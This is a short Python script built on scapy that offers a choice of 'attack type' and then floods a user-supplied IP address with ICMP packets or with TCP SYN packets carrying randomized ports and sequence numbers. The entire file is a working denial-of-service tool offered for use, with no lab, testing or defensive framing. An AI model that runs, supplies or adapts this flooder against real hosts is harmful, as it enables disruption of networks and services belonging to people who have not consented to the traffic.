
from scapy.all import *


def main():
    user_input = input("Please select one of the attack type [tcp, icmp]: ")
    if user_input == "icmp":
        icmpflood()
    elif user_input == "tcp":
        synflood()
    else:
        print("[ERROR] Select one of the attack type !!!")
        main()


def icmpflood():
    target = destinationIP()
    cycle = input("How many packets do you sent [Press enter for 100]: ")
    if cycle == "":
        cycle = 100

    for x in range (0,int(cycle)):
        send(IP(dst=target)/ICMP())


def synflood():
    target = destinationIP()
    targetPort = destinationPort()
    cycle = input("How many packets do you sent [Press enter for 100]: ")
    if cycle == "":
        cycle = 100

    for x in range(0, int(cycle)):
        send(IP(dst=target)/TCP(dport=targetPort,
                                flags="S",
                                seq=RandShort(),
                                ack=RandShort(),
                                sport=RandShort()))


def destinationIP():
    dstIP = input("Destination IP: ")
    return dstIP


def destinationPort():
    dstPort = input("Destination Port: ")
    return int(dstPort)


main()
input('Press ENTER to exit')
